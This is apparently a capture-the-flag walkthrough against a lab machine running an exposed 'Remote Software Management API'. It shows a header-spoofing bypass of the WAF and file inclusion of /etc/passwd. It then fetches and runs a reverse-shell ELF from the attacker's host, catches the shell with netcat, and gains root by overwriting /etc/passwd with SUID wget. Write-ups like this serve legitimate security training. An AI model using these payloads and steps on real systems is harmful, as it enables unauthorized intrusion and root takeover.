### Nmap

We'll begin with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.149   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 07:10 EST
Nmap scan report for 192.168.120.149
Host is up (0.035s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

Our initial scan only shows the SSH service open on port 22. Let's scan all TCP ports next.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.149     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 07:04 EST
Nmap scan report for 192.168.120.149
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
13337/tcp open  unknown
```

We find another service on port 13337. Let's try to get more information about it by running an aggressive scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 13337 -A -T4 192.168.120.149
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 07:12 EST
Nmap scan report for 192.168.120.149
Host is up (0.029s latency).

PORT      STATE SERVICE VERSION
13337/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 5.0 (90%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 2.6.39 (90%), Linux 3.10 - 3.12 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%)
No exact OS matches for host (test conditions non-ideal).
```

The service appears to be HTTP-based.

### HTTP Enumeration

Let's try interacting with this service.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        
        
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        
        
        <div class="divmain">
            <h3>Usage:</h3>
            <div class="divmin">
                <p>/</p>
                <p>Methods: GET</p>
                <p>Returns this page.</p>
            </div>
            <div class="divmin">
                <p>/version</p>
                <p>Methods: GET</p>
                <p>Returns version of the app running.</p>
            </div>
            <div class="divmin">
                <p>/update</p>
                <p>Methods: POST</p>
                <p>Updates the app using a linux executable. Content-Type: application/json
                 {"user":"&lt;user requesting the update&gt;", "url":"&lt;url of the update to download&gt;"}
                 </p>
            </div>
            <div class="divmin">
                <p>/logs</p>
                <p>Methods: GET</p>
                <p>Read log files.</p>
            </div>
            <div class="divmin">
                <p>/restart</p>
                <p>Methods: GET</p>
                <p>To request the restart of the app.</p>
            </div>
    </body>
</html>
```

It looks to be a sensitive API that has been exposed, and the home page has the documentation for it. According to the usage guide, an update URL can be passed via a POST request to the **/update** endpoint with the following JSON data:

```
 {"user":"<user requesting the update>", "url":"<url of the update to download>"}
```

It appears that the target can download a Linux executable file (ELF) for an update and then run it by using the **/restart** endpoint. Another interesting endpoint to note is **/logs** that has the instruction `Read log files`.

## Exploitation

It looks like we need a valid username for the **/update** endpoint. Since brute-forcing it seems infeasible, we'll come back to this endpoint later.

### Bypassing WAF

If we try to visit the **/logs** endpoint (http://192.168.120.149:13337/logs), we are presented with the following error:

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/logs                                                 
WAF: Access Denied for this Host.
```

The API appears to be "protected" by a web application firewall (WAF), which denies access to our host. However, It is easily defeated. Recalling the message `It is just for management on localhost.` on the API's home page, all we have to do is add an HTTP header `X-Forwarded-For` and set it to `localhost` to bypass this access restriction.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/logs -H "X-Forwarded-For: localhost"
Error! No file specified. Use file=/path/to/log/file to access log files.
```

Great! We have bypassed the WAF and have now encountered a new error that appears to be generated by the application itself.

### Local File Inclusion Vulnerability

The error we observed hints at the possibility of an LFI vulnerability. Let's test this theory by trying to access the **/etc/passwd** file.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost"
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        
        
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        
        
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

            </div>
        </div>
    </body>
</html>
```

Nice! At the end of the file, we can see the user `clumsyadmin`. Recall that we needed a valid username to interact with the **/update** endpoint. Seeing as this appears to be the only user on the system other than root, we can next try supplying it to the endpoint.

### Remote Code Execution

We saw in the API documentation that it expects a Linux ELF executable to apply the "update". We'll start by creating our reverse shell payload.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.5 LPORT=4444 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
```

We can host it over HTTP with a basic python web server.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, we'll upload our reverse shell by sending the required POST request to the **/update** endpoint.

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.120.149:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"clumsyadmin","url":"http://192.168.118.5/shell"}'
Update requested by clumsyadmin. Restart the software for changes to take effect.
```

We see a _200-OK_ hit on our web server. It looks like the API successfully downloaded the payload.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.149 - - [12/Mar/2021 08:26:34] "GET /shell HTTP/1.1" 200 -

```

The API is now telling us to target the **/restart** endpoint to initiate service restart. The usage guide says that this request should be a GET. We'll first set up a Netcat listener to catch our shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
```

With our listener started, we'll issue the GET request to restart the service. Unfortunately, it does not seem to work.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.149:13337/restart -H "X-Forwarded-For: localhost"
<html>
    <head>
        <title>Remote Service Software Management API</title>
        <script>
            function restart(){
                if(confirm("Do you really want to restart the app?")){
                    var x = new XMLHttpRequest();
                    x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
                    window.location.assign(window.location.origin.toString());
                }
            }
        </script>
    </head>
    <body>
    <script>restart()</script>
    </body>
</html>
```

Reading the delivered source code, it looks like the request to this endpoint should actually be a POST - not a GET. Let's give that a try.

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://192.168.120.149:13337/restart -H "X-Forwarded-For: localhost"
Restart Successful.
```

The API is reporting that the service has been restarted. If we now look back to our Netcat listener, we have received our reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.149: inverse host lookup failed: Unknown host
connect to [192.168.118.5] from (UNKNOWN) [192.168.120.149] 42202
python -c 'import pty; pty.spawn("/bin/bash")'
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ id
id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$
```

## Escalation

### SUID Enumeration

We'll start local enumeration by looking at the binaries with the SUID bit set.

```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ find / -perm -u=s -type f 2>/dev/null
<admin/webapp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/wget
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

In this listing, we are very fortunate to find the **/usr/bin/wget** binary, which will make for an easy privilege escalation. The binary's `-O` output option will allow us to overwrite sensitive system files. For a straight-forward example, we can overwrite the **/etc/passwd** file and introduce a new user in the `root` group.

We'll create a local copy of the file on our attacking machine.

```
┌──(kali㉿kali)-[~]
└─$ cat passwd  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```

Next, we'll use `openssl` to create a salted password hash in the _passwd_ format for a new user `hacker` with the password `pass123` and append it to our local **passwd** file like so:

```
┌──(kali㉿kali)-[~]
└─$ openssl passwd -1 -salt hacker pass123
$1$hacker$zVnrpoW2JQO5YUrLmAs.o1

┌──(kali㉿kali)-[~]
└─$ echo 'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash' >> passwd

┌──(kali㉿kali)-[~]
└─$ cat passwd                                                                       
root:x:0:0:root:/root:/bin/bash
...
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
```

With our python web server still running on port 80, we'll go ahead and download the modified file to the target, overwriting the target's own **/etc/passwd** file.

```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ wget http://192.168.118.5/passwd -O /etc/passwd
<pp$ wget http://192.168.118.5/passwd -O /etc/passwd
--2021-03-12 08:50:29--  http://192.168.118.5/passwd
Connecting to 192.168.118.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1462 (1.4K) [application/octet-stream]
Saving to: '/etc/passwd'

/etc/passwd         100%[===================>]   1.43K  --.-KB/s    in 0s      

2021-03-12 08:50:29 (224 MB/s) - '/etc/passwd' saved [1462/1462]
```

All that is left to do now is log in as the new user.

```
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ whoami
whoami
clumsyadmin
clumsyadmin@xposedapi:/home/clumsyadmin/webapp$ su hacker
su hacker
Password: pass123

root@xposedapi:/home/clumsyadmin/webapp# whoami
whoami
root
root@xposedapi:/home/clumsyadmin/webapp#
```

Method used by me.

https://gtfobins.github.io/gtfobins/wget/#suid

```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
wget --use-askpass=$TF 0
```